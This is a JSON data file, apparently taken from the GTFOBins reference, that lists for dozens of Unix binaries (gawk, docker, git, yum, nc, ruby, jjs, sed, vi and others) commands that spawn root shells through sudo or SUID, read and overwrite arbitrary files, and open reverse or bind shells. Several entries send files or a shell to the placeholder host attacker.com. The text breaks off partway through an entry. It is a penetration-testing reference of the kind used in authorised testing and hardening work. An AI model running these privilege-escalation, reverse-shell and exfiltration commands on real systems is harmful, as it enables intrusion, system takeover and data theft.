{"screen": {"shell": [{"code": "screen"}], "file-write": [{"description": "This works on screen version 4.06.02. Data is appended to the file and `\\n` is converted to `\\r\\n`.", "code": "LFILE=file_to_write\nscreen -L -Logfile $LFILE echo DATA\n"}, {"description": "This works on screen version 4.05.00. Data is appended to the file and `\\n` is converted to `\\r\\n`.", "code": "LFILE=file_to_write\nscreen -L $LFILE echo DATA\n"}], "sudo": [{"code": "sudo screen"}]}, "gawk": {"shell": [{"code": "gawk 'BEGIN {system(\"/bin/sh\")}'"}], "non-interactive-reverse-shell": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "RHOST=attacker.com\nRPORT=12345\ngawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {\n    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n"}], "non-interactive-bind-shell": [{"description": "Run `nc target.com 12345` on the attacker box to connect to the shell.", "code": "LPORT=12345\ngawk -v LPORT=$LPORT 'BEGIN {\n    s = \"/inet/tcp/\" LPORT \"/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n"}], "file-write": [{"code": "LFILE=file_to_write\ngawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'\n"}], "file-read": [{"code": "LFILE=file_to_read\ngawk '//' \"$LFILE\"\n"}], "sudo": [{"code": "sudo gawk 'BEGIN {system(\"/bin/sh\")}'"}], "limited-suid": [{"code": "./gawk 'BEGIN {system(\"/bin/sh\")}'"}]}, "env": {"shell": [{"code": "env /bin/sh"}], "suid": [{"code": "./env /bin/sh -p"}], "sudo": [{"code": "sudo env /bin/sh"}]}, "byebug": {"shell": [{"code": "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nbyebug $TF\ncontinue\n"}], "limited-suid": [{"code": "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\n./byebug $TF\ncontinue\n"}], "sudo": [{"code": "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nsudo byebug $TF\ncontinue\n"}]}, "rsync": {"shell": [{"code": "rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"}], "sudo": [{"code": "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"}], "suid": [{"code": "./rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"}]}, "highlight": {"file-read": [{"code": "LFILE=file_to_read\nhighlight --no-doc --failsafe \"$LFILE\"\n"}], "suid": [{"code": "LFILE=file_to_read\n./highlight --no-doc --failsafe \"$LFILE\"\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo highlight --no-doc --failsafe \"$LFILE\"\n"}]}, "chmod": {"suid": [{"code": "LFILE=file_to_change\n./chmod 0777 $LFILE\n"}], "sudo": [{"code": "LFILE=file_to_change\nsudo chmod 0777 $LFILE\n"}]}, "docker": {"shell": [{"description": "The resulting is a root shell.", "code": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"}], "file-write": [{"description": "Write a file by copying it to a temporary container and back to the target destination on the host.", "code": "CONTAINER_ID=\"$(docker run -d alpine)\" # or existing\nTF=$(mktemp)\necho \"DATA\" > $TF\ndocker cp $TF $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF file_to_write\n"}], "file-read": [{"description": "Read a file by copying it to a temporary container and back to a new location on the host.", "code": "CONTAINER_ID=\"$(docker run -d alpine)\"  # or existing\nTF=$(mktemp)\ndocker cp file_to_read $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF $TF\ncat $TF\n"}], "sudo": [{"description": "The resulting is a root shell.", "code": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"}], "suid": [{"description": "The resulting is a root shell.", "code": "./docker run -v /:/mnt --rm -it alpine chroot /mnt sh"}]}, "man": {"shell": [{"code": "man man\n!/bin/sh\n"}], "file-read": [{"code": "man file_to_read"}], "sudo": [{"code": "sudo man man\n!/bin/sh\n"}]}, "dd": {"file-write": [{"code": "LFILE=file_to_write\necho \"DATA\" | dd of=$LFILE\n"}], "file-read": [{"code": "LFILE=file_to_read\ndd if=$LFILE\n"}], "suid": [{"code": "LFILE=file_to_write\necho \"data\" | ./dd of=$LFILE\n"}], "sudo": [{"code": "LFILE=file_to_write\necho \"data\" | sudo -E dd of=$LFILE\n"}]}, "gtester": {"shell": [{"code": "TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\ngtester -q $TF\n"}], "sudo": [{"code": "TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n"}], "suid": [{"code": "TF=$(mktemp)\necho '#!/bin/sh -p' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n"}]}, "tail": {"file-read": [{"code": "LFILE=file_to_read\ntail -c1G \"$LFILE\"\n"}], "suid": [{"code": "LFILE=file_to_read\n./tail -c1G \"$LFILE\"\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo tail -c1G \"$LFILE\"\n"}]}, "git": {"shell": [{"code": "PAGER='sh -c \"exec sh 0<&1\"' git -p help"}, {"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "git help config\n!/bin/sh\n"}, {"description": "Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the `-C` option.", "code": "TF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\ngit -C \"$TF\" commit --allow-empty -m x\n"}], "sudo": [{"code": "PAGER='sh -c \"exec sh 0<&1\"' sudo -E git -p help"}, {"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "sudo git -p help config\n!/bin/sh\n"}, {"description": "The help system can also be reached from any `git` command, e.g., `git branch`. This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "sudo git branch --help config\n!/bin/sh\n"}, {"description": "Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the `-C` option.", "code": "TF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\nsudo git -C \"$TF\" commit --allow-empty -m x\n"}], "limited-suid": [{"code": "PAGER='sh -c \"exec sh 0<&1\"' ./git -p help"}]}, "yum": {"sudo": [{"description": "It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nTF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n```\n", "code": "sudo yum localinstall -y x-1.0-1.noarch.rpm\n"}, {"description": "Spawn interactive root shell by loading a custom plugin.\n", "code": "TF=$(mktemp -d)\ncat >$TF/x<<EOF\n[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF\nEOF\n\ncat >$TF/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\ncat >$TF/y.py<<EOF\nimport os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  os.execl('/bin/sh','/bin/sh')\nEOF\n\nsudo yum -c $TF/x --enableplugin=y\n"}]}, "hexdump": {"file-read": [{"code": "LFILE=file_to_read\nhexdump -C \"$LFILE\"\n"}], "suid": [{"code": "LFILE=file_to_read\n./hexdump -C \"$LFILE\"\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo hexdump -C \"$LFILE\"\n"}]}, "uniq": {"file-read": [{"code": "LFILE=file_to_read\nuniq \"$LFILE\"\n"}], "suid": [{"code": "LFILE=file_to_read\n./uniq \"$LFILE\"\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo uniq \"$LFILE\"\n"}]}, "dpkg": {"shell": [{"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "dpkg -l\n!/bin/sh\n"}], "sudo": [{"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "sudo dpkg -l\n!/bin/sh\n"}, {"description": "It runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nTF=$(mktemp -d)\necho 'exec /bin/sh' > $TF/x.sh\nfpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF\n```\n", "code": "sudo dpkg -i x_1.0_all.deb"}]}, "strings": {"file-read": [{"code": "LFILE=file_to_read\nstrings \"$LFILE\"\n"}], "suid": [{"code": "LFILE=file_to_read\n./strings \"$LFILE\"\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo strings \"$LFILE\"\n"}]}, "mysql": {"shell": [{"code": "mysql -e '\\! /bin/sh'"}], "sudo": [{"code": "sudo mysql -e '\\! /bin/sh'"}], "limited-suid": [{"code": "./mysql -e '\\! /bin/sh'"}], "library-load": [{"description": "A MySQL server must accept connections in order for this to work.\n\nThe following loads the `/path/to/lib.so` shared object.\n", "code": "mysql --default-auth ../../../../../path/to/lib"}]}, "base32": {"file-read": [{"code": "LFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode\n"}], "suid": [{"code": "LFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo base32 \"$LFILE\" | base32 --decode\n"}]}, "sort": {"file-read": [{"code": "LFILE=file_to_read\nsort -m \"$LFILE\"\n"}], "suid": [{"code": "LFILE=file_to_read\n./sort -m \"$LFILE\"\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo sort -m \"$LFILE\"\n"}]}, "jrunscript": {"shell": [{"code": "jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""}], "reverse-shell": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\njrunscript -e 'var host='\"'\"\"$RHOST\"\"'\"'; var port='\"$RPORT\"';\nvar p=new java.lang.ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start();\nvar s=new java.net.Socket(host,port);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){\nwhile(pi.available()>0)so.write(pi.read());\nwhile(pe.available()>0)so.write(pe.read());\nwhile(si.available()>0)po.write(si.read());\nso.flush();po.flush();\njava.lang.Thread.sleep(50);\ntry {p.exitValue();break;}catch (e){}};p.destroy();s.close();'\n"}], "file-download": [{"description": "Fetch a remote file via HTTP GET request.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\njrunscript -e \"cp('$URL','$LFILE')\"\n"}], "file-write": [{"code": "jrunscript -e 'var fw=new java.io.FileWriter(\"./file_to_write\"); fw.write(\"DATA\"); fw.close();'"}], "file-read": [{"code": "jrunscript -e 'br = new BufferedReader(new java.io.FileReader(\"file_to_read\")); while ((line = br.readLine()) != null) { print(line); }'"}], "suid": [{"description": "This has been found working in macOS but failing on Linux systems.", "code": "./jrunscript -e \"exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\""}], "sudo": [{"code": "sudo jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""}]}, "eb": {"shell": [{"code": "eb logs\n!/bin/sh\n"}], "sudo": [{"code": "sudo eb logs\n!/bin/sh\n"}]}, "uudecode": {"file-read": [{"code": "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"}], "suid": [{"code": "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n"}]}, "nc": {"reverse-shell": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.", "code": "RHOST=attacker.com\nRPORT=12345\nnc -e /bin/sh $RHOST $RPORT\n"}], "bind-shell": [{"description": "Run `nc target.com 12345` on the attacker box to connect to the shell. This only works with netcat traditional.", "code": "LPORT=12345\nnc -l -p $LPORT -e /bin/sh\n"}], "file-upload": [{"description": "Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file.", "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nnc $RHOST $RPORT < \"$LFILE\"\n"}], "file-download": [{"description": "Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file.", "code": "LPORT=12345\nLFILE=file_to_save\nnc -l -p $LPORT > \"$LFILE\"\n"}], "sudo": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.", "code": "RHOST=attacker.com\nRPORT=12345\nsudo nc -e /bin/sh $RHOST $RPORT\n"}], "limited-suid": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.", "code": "RHOST=attacker.com\nRPORT=12345\n./nc -e /bin/sh $RHOST $RPORT\n"}]}, "tee": {"file-write": [{"code": "LFILE=file_to_write\necho DATA | ./tee -a \"$LFILE\"\n"}], "suid": [{"code": "LFILE=file_to_write\necho DATA | ./tee -a \"$LFILE\"\n"}], "sudo": [{"code": "LFILE=file_to_write\necho DATA | sudo tee -a \"$LFILE\"\n"}]}, "restic": {"file-upload": [{"code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nrestic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"}], "sudo": [{"code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nsudo restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"}], "suid": [{"code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n./restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"}]}, "setarch": {"shell": [{"code": "setarch $(arch) /bin/sh"}], "suid": [{"code": "./setarch $(arch) /bin/sh -p"}], "sudo": [{"code": "sudo setarch $(arch) /bin/sh"}]}, "yelp": {"file-read": [{"description": "This spawns a graphical window containing the file content somehow corrupted by word wrapping, it might not be suitable to read arbitrary files. The path must be absolute.", "code": "LFILE=file_to_read\nyelp \"man:$LFILE\"\n"}]}, "eqn": {"file-read": [{"code": "LFILE=file_to_read\neqn \"$LFILE\"\n"}], "suid": [{"code": "LFILE=file_to_read\n./eqn \"$LFILE\"\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo eqn \"$LFILE\"\n"}]}, "pg": {"shell": [{"code": "pg /etc/profile\n!/bin/sh\n"}], "file-read": [{"code": "pg file_to_read"}], "sudo": [{"code": "sudo pg /etc/profile\n!/bin/sh\n"}], "suid": [{"code": "./pg file_to_read"}]}, "jjs": {"shell": [{"code": "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | jjs"}], "reverse-shell": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\necho 'var host=Java.type(\"java.lang.System\").getenv(\"RHOST\");\nvar port=Java.type(\"java.lang.System\").getenv(\"RPORT\");\nvar ProcessBuilder = Java.type(\"java.lang.ProcessBuilder\");\nvar p=new ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start();\nvar Socket = Java.type(\"java.net.Socket\");\nvar s=new Socket(host,port);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(\"java.lang.Thread\").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs\n"}], "file-download": [{"description": "Fetch a remote file via HTTP GET request.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\necho \"var URL = Java.type('java.net.URL');\nvar ws = new URL('$URL');\nvar Channels = Java.type('java.nio.channels.Channels');\nvar rbc = Channels.newChannel(ws.openStream());\nvar FileOutputStream = Java.type('java.io.FileOutputStream');\nvar fos = new FileOutputStream('$LFILE');\nfos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);\nfos.close();\nrbc.close();\" | jjs\n"}], "file-write": [{"code": "echo 'var FileWriter = Java.type(\"java.io.FileWriter\");\nvar fw=new FileWriter(\"./file_to_write\");\nfw.write(\"DATA\");\nfw.close();' | jjs\n"}], "file-read": [{"code": "echo 'var BufferedReader = Java.type(\"java.io.BufferedReader\");\nvar FileReader = Java.type(\"java.io.FileReader\");\nvar br = new BufferedReader(new FileReader(\"file_to_read\"));\nwhile ((line = br.readLine()) != null) { print(line); }' | jjs\n"}], "suid": [{"description": "This has been found working in macOS but failing on Linux systems.", "code": "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | ./jjs"}], "sudo": [{"code": "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | sudo jjs"}]}, "genisoimage": {"file-read": [{"code": "LFILE=file_to_read\ngenisoimage -q -o - \"$LFILE\"\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo genisoimage -q -o - \"$LFILE\"\n"}]}, "red": {"file-write": [{"code": "red file_to_write\na\nDATA\n.\nw\nq\n"}], "file-read": [{"code": "red file_to_read\n,p\nq\n"}], "sudo": [{"code": "sudo red file_to_write\na\nDATA\n.\nw\nq\n"}]}, "mtr": {"file-read": [{"code": "LFILE=file_to_read\nmtr --raw -F \"$LFILE\"\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo mtr --raw -F \"$LFILE\"\n"}]}, "mount": {"sudo": [{"description": "Exploit the fact that `mount` can be executed via `sudo` to *replace* the `mount` binary with a shell.", "code": "sudo mount -o bind /bin/sh /bin/mount\nsudo mount\n"}]}, "cat": {"file-read": [{"code": "LFILE=file_to_read\ncat \"$LFILE\"\n"}], "suid": [{"code": "LFILE=file_to_read\n./cat \"$LFILE\"\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo cat \"$LFILE\"\n"}]}, "tcpdump": {"command": [{"code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\ntcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF\n"}], "sudo": [{"code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root\n"}]}, "ksshell": {"file-read": [{"code": "LFILE=file_to_read\nksshell -i $LFILE\n"}], "suid": [{"code": "LFILE=file_to_read\n./ksshell -i $LFILE\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo ksshell -i $LFILE\n"}]}, "expand": {"file-read": [{"code": "LFILE=file_to_read\nexpand \"$LFILE\"\n"}], "suid": [{"code": "LFILE=file_to_read\n./expand \"$LFILE\"\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo expand \"$LFILE\"\n"}]}, "rlwrap": {"shell": [{"code": "rlwrap /bin/sh"}], "file-write": [{"description": "This adds timestamps to the output file. This relies on the external `echo` command.", "code": "LFILE=file_to_write\nrlwrap -l \"$LFILE\" echo DATA\n"}], "suid": [{"code": "./rlwrap -H /dev/null /bin/sh -p"}], "sudo": [{"code": "sudo rlwrap /bin/sh"}]}, "bundler": {"shell": [{"description": "This invokes the default pager, which is likely to be  [`less`](/gtfobins/man/), other functions may apply.", "code": "bundler help\n!/bin/sh\n"}, {"code": "export BUNDLE_GEMFILE=x\nbundler exec /bin/sh\n"}, {"code": "TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundler exec /bin/sh\n"}, {"description": "This spawns an interactive shell via [`irb`](/gtfobins/irb/).", "code": "TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundler console\nsystem('/bin/sh -c /bin/sh')\n"}, {"code": "TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/Gemfile\ncd $TF\nbundler install\n"}], "sudo": [{"description": "This invokes the default pager, which is likely to be  [`less`](/gtfobins/man/), other functions may apply.", "code": "sudo bundler help\n!/bin/sh\n"}]}, "run-mailcap": {"shell": [{"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "run-mailcap --action=view /etc/hosts\n!/bin/sh\n"}], "file-read": [{"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "run-mailcap --action=view file_to_read"}], "file-write": [{"description": "The file must exist and be not empty.\n\nThis invokes the default editor, which is likely to be [`vi`](/gtfobins/vi/), other functions may apply.\n", "code": "run-mailcap --action=edit file_to_read"}], "sudo": [{"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "sudo run-mailcap --action=view /etc/hosts\n!/bin/sh\n"}]}, "scp": {"shell": [{"code": "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nscp -S $TF x y:\n"}], "file-upload": [{"description": "Send local file to a SSH server.", "code": "RPATH=user@attacker.com:~/file_to_save\nLPATH=file_to_send\nscp $LFILE $RPATH\n"}], "file-download": [{"description": "Fetch a remote file from a SSH server.", "code": "RPATH=user@attacker.com:~/file_to_get\nLFILE=file_to_save\nscp $RPATH $LFILE\n"}], "sudo": [{"code": "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nsudo scp -S $TF x y:\n"}], "limited-suid": [{"code": "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\n./scp -S $TF a b:\n"}]}, "ip": {"file-read": [{"code": "LFILE=file_to_read\nip -force -batch \"$LFILE\"\n"}], "suid": [{"code": "LFILE=file_to_read\n./ip -force -batch \"$LFILE\"\n"}, {"description": "This only works for Linux with CONFIG_NET_NS=y.", "code": "./ip netns add foo\n./ip netns exec foo /bin/sh -p\n./ip netns delete foo\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo ip -force -batch \"$LFILE\"\n"}, {"description": "This only works for Linux with CONFIG_NET_NS=y.", "code": "sudo ip netns add foo\nsudo ip netns exec foo /bin/sh\nsudo ip netns delete foo\n"}]}, "valgrind": {"shell": [{"code": "valgrind /bin/sh"}], "sudo": [{"code": "sudo valgrind /bin/sh"}]}, "expect": {"shell": [{"code": "expect -c 'spawn /bin/sh;interact'"}], "suid": [{"code": "./expect -c 'spawn /bin/sh -p;interact'"}], "sudo": [{"code": "sudo expect -c 'spawn /bin/sh;interact'"}]}, "ruby": {"shell": [{"code": "ruby -e 'exec \"/bin/sh\"'"}], "reverse-shell": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n"}], "file-upload": [{"description": "Serve files in the local folder running an HTTP server. This requires version 1.9.2 or later.", "code": "export LPORT=8888\nruby -run -e httpd . -p $LPORT\n"}], "file-download": [{"description": "Fetch a remote file via HTTP GET request.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nruby -e 'require \"open-uri\"; download = open(ENV[\"URL\"]); IO.copy_stream(download, ENV[\"LFILE\"])'\n"}], "file-write": [{"code": "ruby -e 'File.open(\"file_to_write\", \"w+\") { |f| f.write(\"DATA\") }'"}], "file-read": [{"code": "ruby -e 'puts File.read(\"file_to_read\")'"}], "library-load": [{"code": "ruby -e 'require \"fiddle\"; Fiddle.dlopen(\"lib.so\")'"}], "sudo": [{"code": "sudo ruby -e 'exec \"/bin/sh\"'"}], "capabilities": [{"code": "./ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"}]}, "xargs": {"shell": [{"description": "GNU version only.", "code": "xargs -a /dev/null sh"}, {"code": "echo x | xargs -Iy sh -c 'exec sh 0<&1'"}, {"description": "Read interactively from `stdin`.", "code": "xargs -Ix sh -c 'exec sh 0<&1'\nx^D^D\n"}], "file-read": [{"description": "This works as long as the file does not contain the NUL character, also a trailing `$'\\n'` is added. The actual `/bin/echo` command is executed. GNU version only.", "code": "LFILE=file_to_read\nxargs -a \"$LFILE\" -0\n"}], "suid": [{"description": "GNU version only.", "code": "./xargs -a /dev/null sh -p"}], "sudo": [{"description": "GNU version only.", "code": "sudo xargs -a /dev/null sh"}]}, "iconv": {"file-write": [{"code": "LFILE=file_to_write\necho \"DATA\" | iconv -f 8859_1 -t 8859_1 -o \"$LFILE\"\n"}], "file-read": [{"code": "LFILE=file_to_read\niconv -f 8859_1 -t 8859_1 \"$LFILE\"\n"}], "suid": [{"code": "LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n"}], "sudo": [{"code": "LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n"}]}, "logsave": {"shell": [{"code": "logsave /dev/null /bin/sh -i"}], "sudo": [{"code": "sudo logsave /dev/null /bin/sh -i"}], "suid": [{"code": "./logsave /dev/null /bin/sh -i -p"}]}, "csh": {"shell": [{"code": "csh"}], "file-write": [{"code": "export LFILE=file_to_write\nash -c 'echo DATA > $LFILE'\n"}], "suid": [{"code": "./csh -b"}], "sudo": [{"code": "sudo csh"}]}, "ltrace": {"shell": [{"code": "ltrace -b -L /bin/sh"}], "sudo": [{"code": "sudo ltrace -b -L /bin/sh"}]}, "stdbuf": {"shell": [{"code": "stdbuf -i0 /bin/sh"}], "suid": [{"code": "./stdbuf -i0 /bin/sh -p"}], "sudo": [{"code": "sudo stdbuf -i0 /bin/sh"}]}, "pdb": {"shell": [{"code": "TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\npdb $TF\ncont\n"}], "sudo": [{"code": "TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\nsudo pdb $TF\ncont\n"}]}, "sed": {"shell": [{"description": "GNU version only. Also, this requires `bash`.", "code": "sed -n '1e exec sh 1>&0' /etc/hosts"}, {"description": "GNU version only. The resulting shell is not a proper TTY shell.", "code": "sed e"}], "command": [{"description": "GNU version only.", "code": "sed -n '1e id' /etc/hosts"}], "file-write": [{"code": "LFILE=file_to_write\nsed -n \"1s/.*/DATA/w $LFILE\" /etc/hosts\n"}], "file-read": [{"code": "LFILE=file_to_read\nsed '' \"$LFILE\"\n"}], "suid": [{"code": "LFILE=file_to_read\n./sed -e '' \"$LFILE\"\n"}], "sudo": [{"description": "GNU version only. Also, this requires `bash`.", "code": "sudo sed -n '1e exec sh 1>&0' /etc/hosts"}]}, "cancel": {"file-upload": [{"description": "Send local file using a TCP connection. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file.", "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\ncancel -u \"$(cat $LFILE)\" -h $RHOST:$RPORT\n"}]}, "nano": {"shell": [{"code": "nano\n^R^X\nreset; sh 1>&0 2>&0\n"}, {"description": "The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.", "code": "nano -s /bin/sh\n/bin/sh\n^T\n"}], "file-write": [{"code": "nano file_to_write\nDATA\n^O\n"}], "file-read": [{"code": "nano file_to_read"}], "suid": [{"description": "The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.", "code": "./nano\n^R^X\nreset; sh 1>&0 2>&0\n"}], "sudo": [{"code": "sudo nano\n^R^X\nreset; sh 1>&0 2>&0\n"}]}, "journalctl": {"shell": [{"code": "journalctl\n!/bin/sh\n"}], "sudo": [{"code": "sudo journalctl\n!/bin/sh\n"}]}, "strace": {"shell": [{"code": "strace -o /dev/null /bin/sh"}], "suid": [{"code": "./strace -o /dev/null /bin/sh -p"}], "sudo": [{"code": "sudo strace -o /dev/null /bin/sh"}]}, "vi": {"shell": [{"code": "vi -c ':!/bin/sh' /dev/null"}, {"code": "vi\n:set shell=/bin/sh\n:shell\n"}], "file-write": [{"code": "vi file_to_write\niDATA\n^[\nw\n"}], "file-read": [{"code": "vi file_to_read"}], "sudo": [{"code": "sudo vi -c ':!/bin/sh' /dev/null"}]}, "zsoelim": {"file-read": [{"code": "LFILE=file_to_read\nzsoelim \"$LFILE\"\n"}], "suid": [{"code": "LFILE=file_to_read\n./zsoelim \"$LFILE\"\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo zsoelim 